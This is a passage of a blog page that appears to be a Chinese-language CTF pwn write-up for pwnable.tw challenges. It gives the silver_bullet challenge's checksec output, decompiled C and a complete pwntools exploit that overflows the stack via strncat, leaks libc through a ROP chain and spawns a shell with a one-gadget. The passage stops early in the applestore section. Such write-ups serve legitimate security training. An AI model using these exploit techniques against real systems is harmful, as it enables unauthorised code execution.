<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Challenges 100 Week 10 - Niebelungen</title><meta name="Description" content=""><meta property="og:title" content="Challenges 100 Week 10" />
<meta property="og:description" content="Challenges_100-Week_10



Challenges
Tricks




pwnble.tw-silver_bullet
stack overflow


pwnable.tw-applestore
UAF in stack


pwnable.tw-Re-alloc
UAF&#43;tcache poisoning


pwnable.tw-Tcache Tear
tcache poisoning


Lilac 2021 五一欢乐赛-babyFAT
数组超界


Lilac 2021 五一欢乐赛-befunge
数组超界


Lilac 2021 五一欢乐赛-noleak
house_of_roman&#43;IO_file leak


" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://example.org/posts/challenges-100-week-10/" /><meta property="og:image" content="http://example.org/favicon.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-05-07T00:26:48+08:00" />
<meta property="article:modified_time" content="2021-05-07T00:26:48+08:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="http://example.org/favicon.png"/>

<meta name="twitter:title" content="Challenges 100 Week 10"/>
<meta name="twitter:description" content="Challenges_100-Week_10



Challenges
Tricks




pwnble.tw-silver_bullet
stack overflow


pwnable.tw-applestore
UAF in stack


pwnable.tw-Re-alloc
UAF&#43;tcache poisoning


pwnable.tw-Tcache Tear
tcache poisoning


Lilac 2021 五一欢乐赛-babyFAT
数组超界


Lilac 2021 五一欢乐赛-befunge
数组超界


Lilac 2021 五一欢乐赛-noleak
house_of_roman&#43;IO_file leak


"/>
<meta name="application-name" content="Niebelungen">
<meta name="apple-mobile-web-app-title" content="Niebelungen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/challenges-100-week-10/" /><link rel="prev" href="http://example.org/posts/challenges-100-week-9/" /><link rel="next" href="http://example.org/posts/ciscn2021-pwn/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Challenges 100 Week 10",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/example.org\/posts\/challenges-100-week-10\/"
        },"genre": "posts","keywords": "Writeups","wordcount":  10354 ,
        "url": "http:\/\/example.org\/posts\/challenges-100-week-10\/","datePublished": "2021-05-07T00:26:48+08:00","dateModified": "2021-05-07T00:26:48+08:00","publisher": {
            "@type": "Organization",
            "name": "Niebelungen"},"author": {
                "@type": "Person",
                "name": "Niebelungen"
            },"description": ""
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Niebelungen">Niebelungen</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Niebelungen">Niebelungen</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Challenges 100 Week 10</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Niebelungen</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/writeups/"><i class="far fa-folder fa-fw"></i>Writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-07">2021-05-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 10354 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 21 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#checksec">checksec</a></li>
    <li><a href="#ida">IDA</a></li>
    <li><a href="#exp">exp</a></li>
  </ul>

  <ul>
    <li><a href="#checksec-1">checksec</a></li>
    <li><a href="#ida-1">IDA</a></li>
    <li><a href="#exp-1">exp</a></li>
  </ul>

  <ul>
    <li><a href="#checksec-2">checksec</a></li>
    <li><a href="#ida-2">IDA</a></li>
    <li><a href="#exp-2">exp</a></li>
  </ul>

  <ul>
    <li><a href="#checksec-3">checksec</a></li>
    <li><a href="#ida-3">IDA</a></li>
    <li><a href="#exp-3">exp</a></li>
  </ul>

  <ul>
    <li><a href="#checksec-4">checksec</a></li>
    <li><a href="#ida-4">IDA</a></li>
    <li><a href="#exp-4">exp</a></li>
  </ul>

  <ul>
    <li><a href="#checksc">checksc</a></li>
    <li><a href="#ida-5">IDA</a>
      <ul>
        <li><a href="#befunge-93-instruction-listhttpsenwikipediaorgwikibefunge"><a href="https://en.wikipedia.org/wiki/Befunge">Befunge-93 instruction list</a></a></li>
      </ul>
    </li>
    <li><a href="#exp-5">exp</a></li>
  </ul>

  <ul>
    <li><a href="#check">check</a></li>
    <li><a href="#ida-6">IDA</a></li>
    <li><a href="#exp-6">exp</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="challenges_100-week_10">Challenges_100-Week_10</h1>
<table>
<thead>
<tr>
<th style="text-align:center">Challenges</th>
<th style="text-align:center">Tricks</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">pwnble.tw-silver_bullet</td>
<td style="text-align:center"><code>stack overflow</code></td>
</tr>
<tr>
<td style="text-align:center">pwnable.tw-applestore</td>
<td style="text-align:center"><code>UAF in stack</code></td>
</tr>
<tr>
<td style="text-align:center">pwnable.tw-Re-alloc</td>
<td style="text-align:center"><code>UAF</code>+<code>tcache poisoning</code></td>
</tr>
<tr>
<td style="text-align:center">pwnable.tw-Tcache Tear</td>
<td style="text-align:center"><code>tcache poisoning</code></td>
</tr>
<tr>
<td style="text-align:center">Lilac 2021 五一欢乐赛-babyFAT</td>
<td style="text-align:center"><code>数组超界</code></td>
</tr>
<tr>
<td style="text-align:center">Lilac 2021 五一欢乐赛-befunge</td>
<td style="text-align:center"><code>数组超界</code></td>
</tr>
<tr>
<td style="text-align:center">Lilac 2021 五一欢乐赛-noleak</td>
<td style="text-align:center"><code>house_of_roman</code>+<code>IO_file leak</code></td>
</tr>
</tbody>
</table>
<h1 id="silver_bullet">silver_bullet</h1>
<h2 id="checksec">checksec</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="ida">IDA</h2>
<p><strong>create</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">create_bullet</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-4h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">s</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You have been created the Bullet !&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Give me your description of bullet :&#34;</span><span class="p">);</span>
  <span class="n">read_input</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x30u</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Your power is : %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Good luck !!&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>power_up</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">power_up</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-34h] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+30h] [ebp-4h]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">dest</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You need create the bullet first !&#34;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x2Fu</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can&#39;t power up any more !&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Give me your another description of bullet :&#34;</span><span class="p">);</span>
  <span class="n">read_input</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">48</span> <span class="o">-</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>
  <span class="n">strncat</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">48</span> <span class="o">-</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Your new power is : %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enjoy it !&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>我尝试运行程序，输入几个垃圾数据，发现在<code>power_up</code>中，能覆盖长度，从而得到一个很大的数，从而在beat中正常退出程序执行ROP。
所以漏洞点在<code>power_up</code>中。这里在<code>strncat</code>在拼接字符串后，会在最后加”\x00“进行截断，可以覆盖大小，产生栈溢出。</p>
<h2 id="exp">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span>

<span class="n">local</span><span class="o">=</span><span class="mi">0</span>
<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./silver_bullet&#39;</span>
<span class="c1">#gdb.attach(p)</span>
<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
	<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
	<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;chall.pwnable.tw&#39;</span><span class="p">,</span><span class="mi">10103</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc_32.so.6&#39;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="c1">#gdb.attach(p)</span>
<span class="n">one</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x3a819</span><span class="p">,</span> <span class="mh">0x5f065</span><span class="p">,</span> <span class="mh">0x5f066</span><span class="p">]</span>

<span class="c1">#create</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">47</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">#power up</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your another description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x8048954</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your another description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
<span class="n">read_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="n">read_addr</span><span class="p">)</span>
<span class="n">libcbase</span><span class="o">=</span> <span class="n">read_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
<span class="n">one_gedget</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span><span class="n">one</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">47</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">#power up</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;a&#39;</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your another description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
<span class="n">payload</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">one_gedget</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Give me your another description of bullet :&#39;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="pwnabletw-applestore">pwnable.tw-applestore</h1>
<h2 id="checksec-1">checksec</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-1">IDA</h2>
<p><strong>handler</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">handler</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">22</span><span class="p">];</span> <span class="c1">// [esp+16h] [ebp-22h] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+2Ch] [ebp-Ch]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">my_read</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mh">0x15u</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">nptr</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">list</span><span class="p">();</span><span class="c1">//列出商品菜单，useless
</span><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">add</span><span class="p">();</span><span class="c1">//向链表中添加一个商品
</span><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">delete</span><span class="p">();</span><span class="c1">//从链表中删除一个商品
</span><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
        <span class="n">cart</span><span class="p">();</span><span class="c1">//列出链表中所有的商品
</span><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">checkout</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Thank You for Your Purchase!&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;It&#39;s not a choice! Idiot.&#34;</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>add</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
